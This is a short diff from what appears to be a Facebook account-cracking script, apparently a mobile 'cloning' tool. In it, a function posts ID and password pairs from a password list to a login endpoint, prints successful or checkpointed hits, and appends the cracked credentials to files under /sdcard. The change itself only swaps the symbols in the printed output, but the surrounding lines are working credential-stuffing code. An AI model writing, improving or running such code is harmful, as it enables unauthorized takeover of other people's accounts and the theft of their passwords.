@@ -527,13 +527,13 @@ def api1(ids,names,passlist):
 				po = requests.post(url,data=data,headers=head,allow_redirects=False).text
 				q = json.loads(po)
 				if 'session_key' in q:
-					print('\r\r\033[1;32m [JALIIIL-OK] '+ids+' | '+pas+'\033[1;97m')
+					print('\r\r\033[1;32m [JALIIIL-OK] '+ids+' √ '+pas+'\033[1;97m')
 					open('/sdcard/JALIIIL/JALIIIL-OK.txt','a').write(ids+'|'+pas+'\n')
 					oks.append(ids)
 					break
 				elif 'www.facebook.com' in q['error_msg']:
 					if 'y' in pcp:
-						print('\r\r\x1b[38;5;205m [JALIIIL-CP] '+ids+' √ '+pas+'\033[1;97m')
+						print('\r\r\x1b[38;5;205m [JALIIIL-CP] '+ids+' ✗ '+pas+'\033[1;97m')
 						open('/sdcard/JALIIIL/JALIIIL-CP.txt','a').write(ids+'|'+pas+'\n')
 						cps.append(ids)
 						break
